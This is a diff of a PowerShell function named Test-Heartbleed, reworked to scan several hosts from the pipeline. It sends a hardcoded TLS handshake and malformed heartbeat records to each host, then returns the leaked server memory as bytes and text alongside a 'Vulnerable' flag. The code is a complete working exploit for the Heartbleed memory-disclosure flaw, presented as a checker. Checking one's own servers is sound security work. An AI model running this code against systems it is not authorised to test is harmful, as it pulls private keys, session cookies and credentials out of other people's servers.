@@ -90,19 +90,20 @@ function Test-Heartbleed
     Param(
         [Parameter(
             Mandatory=$true,
-            HelpMessage="IP address or hostname to check")]
-            [string]$ComputerName,
+            HelpMessage = "IP address or hostname to check",
+            ValueFromPipelineByPropertyName = $true,
+            Position = 0)]
+            [string[]]$Computername,
 
         [Parameter(
-            HelpMessage="File to write resulting data to")]
-            [string]$File="$($ComputerName)-hbdata.dat",
-
-        [Parameter(
-            HelpMessage="TCP port number that SSL application is listening on")]
+            HelpMessage="TCP port number that SSL application is listening on",
+            ValueFromPipelineByPropertyName = $true,
+            Position = 1)]
             [int]$Port=443,
 
         [Parameter(
-            HelpMessage="Number of heartbeats to send")]
+            HelpMessage="Number of heartbeats to send",
+            ValueFromPipelineByPropertyName = $true)]
             [int]$TLSTries=3,
 
         [Parameter(
@@ -121,110 +122,137 @@ function Test-Heartbleed
             HelpMessage="Enable to send the plaintext STARTTLS command.")]
             [switch]$STARTTLS=$false
     )
-    $outstream = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($File)
-    $tls_clienthello = [Byte[]] (
-    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
-    0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
-    0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
-    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
-    0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
-    0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
-    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
-    0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
-    0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
-    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
-    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
-    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
-    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
-    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
-    0x01)
+    Begin
+    {
+        $tls_clienthello = [Byte[]] (
+        0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d,
+        0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc,
+        0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
+        0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f,
+        0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16,
+        0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
+        0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04,
+        0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05,
+        0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
+        0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
+        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
+        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
+        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01,
+        0x01)
 
-    $heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 )
-    $ErrorActionPreference = "Continue"
+        $heartbeat = [Byte[]] ( 0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00 )
+    }
 
-    $IP = [System.Net.Dns]::GetHostByName($ComputerName).AddressList[0].IPAddressToString
-    $offset = 0
-    $temp = New-Object Byte[] 16384
-    $buf = New-Object Byte[] 8388608
+    Process
+    {
+        $ErrorActionPreference = "Continue"
+        foreach($computer in $Computername)
+        {
+            $vulnerable = $true
+            Write-Verbose "Testing $($computer)"
+            $IP = [System.Net.Dns]::GetHostByName($computer).AddressList[0].IPAddressToString
+            $offset = 0
+            $temp = New-Object Byte[] 16384
+            $buf = New-Object Byte[] 8388608
 
-    for ($nt = 0; $nt -lt $TLSTries; $nt++) {
-        $msg = "Connection attempt number: {0}" -f ($nt + 1)
-        Write-Verbose $msg
-        Try {
-            $tcp = New-Object System.Net.Sockets.TcpClient
-            $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
-            $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)
-
-            if (!$wait) 
-            {
-                Throw [System.Exception] "TCP Connection Timeout Exceeded"
-            }
-            
-            $tcp.EndConnect($conn)
-            $stream = $tcp.GetStream()
-
-            # send starttls if we need to
-            
-            if ($STARTTLS) 
-            {
-                # any bytes waiting?  read them...
-                $awh = $stream.BeginRead($temp,0,$temp.Length,$null,$null)
-                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
-                $n = $stream.EndRead($awh)
-
-                # send the STARTTLS command
-                $st = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n`r`n")
-                $stream.Write($st,0,$st.Length)
-                $n = $stream.Read($temp,0,$temp.length)
-            }
-
-            # send TLS client hello
-            $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
-
-            # get TLS server hello
-            $n = $stream.Read($temp,0,$temp.length)
-            
-            if ( $temp[0] -ne 0x16) 
-            {
-                Throw [System.Exception] "Malformed TLS Server Hello"
-            }
-
-            Write-Verbose "Sending $($Heartbeats) TLS heartbeat packets"
-            for ($i=0; $i -lt $Heartbeats; $i++) 
-            {
-                $stream.Write($heartbeat,0,$heartbeat.Length)
-
-                $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
-                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
-                
-                if(!$wait) 
-                {
-                    Throw [System.Exception] "No Response to TLS HeartBeat() request.  Host is not vulnerable!"
-                }
-                
-                $n = $stream.EndRead($awh)
-                $offset += $n
-
-                $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
+            for ($nt = 0; $nt -lt $TLSTries; $nt++) {
+                $msg = "Connection attempt number: {0}" -f ($nt + 1)
                 Write-Verbose $msg
+                Try {
+                    $tcp = New-Object System.Net.Sockets.TcpClient
+                    $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
+                    $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)
+
+                    if (!$wait) 
+                    {
+                        Throw [System.Exception] "TCP Connection Timeout Exceeded"
+                    }
+            
+                    $tcp.EndConnect($conn)
+                    $stream = $tcp.GetStream()
+
+                    # send starttls if we need to
+            
+                    if ($STARTTLS) 
+                    {
+                        # any bytes waiting?  read them...
+                        $awh = $stream.BeginRead($temp,0,$temp.Length,$null,$null)
+                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                        $n = $stream.EndRead($awh)
+
+                        # send the STARTTLS command
+                        $st = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n`r`n")
+                        $stream.Write($st,0,$st.Length)
+                        $n = $stream.Read($temp,0,$temp.length)
+                    }
+
+                    # send TLS client hello
+                    $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
+
+                    # get TLS server hello
+                    $n = $stream.Read($temp,0,$temp.length)
+            
+                    if ( $temp[0] -ne 0x16) 
+                    {
+                        Throw [System.Exception] "Malformed TLS Server Hello"
+                    }
+
+                    Write-Verbose "Sending $($Heartbeats) TLS heartbeat packets"
+                    for ($i=0; $i -lt $Heartbeats; $i++) 
+                    {
+                        $stream.Write($heartbeat,0,$heartbeat.Length)
+
+                        $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
+                        $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
                 
-                if (!$NoRandomDelay) 
+                        if(!$wait) 
+                        {
+                            Write-Verbose "No Response to TLS HeartBeat() request on $($computer). Attepmp $($nt)."
+                            $vulnerable = $false
+                            break
+                        }
+                        Try
+                        {
+                            $n = $stream.EndRead($awh)
+                            $offset += $n
+                        }
+                        Catch
+                        {
+                            Write-Verbose "Could not read response from host $($computer). Attepmp $($nt)."
+                            $vulnerable = $false
+                            break
+                        }
+
+                        $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
+                        Write-Verbose $msg
+                
+                        if (!$NoRandomDelay) 
+                        {
+                            $sleeptime = Get-Random -Minimum 0 -Maximum 500
+                            Start-Sleep -Milliseconds $sleeptime
+                        }
+                    }
+                }
+                Catch 
                 {
-                    $sleeptime = Get-Random -Minimum 0 -Maximum 500
-                    Start-Sleep -Milliseconds $sleeptime
+                    Throw
+                }
+                Finally 
+                {
+                    $tcp.close()
                 }
             }
-        }
-        Catch 
-        {
-            Throw
-        }
-        Finally 
-        {
-            $tcp.close()
+
+            $result = New-Object -TypeName psobject -Property @{
+                "Host" = $computer
+                "Vulnerable" = $vulnerable
+                "Bytes" = ($buf[0..$offset])
+                "String" = [System.Text.Encoding]::ASCII.GetString(($buf[0..$offset]))
+                
+            }
+            $result
+
         }
     }
-    $msg = "Writing {0} total bytes to '$File'" -f $offset
-    Write-Verbose $msg
-    [IO.File]::WriteAllBytes($outstream,$buf[0..$offset])
 }
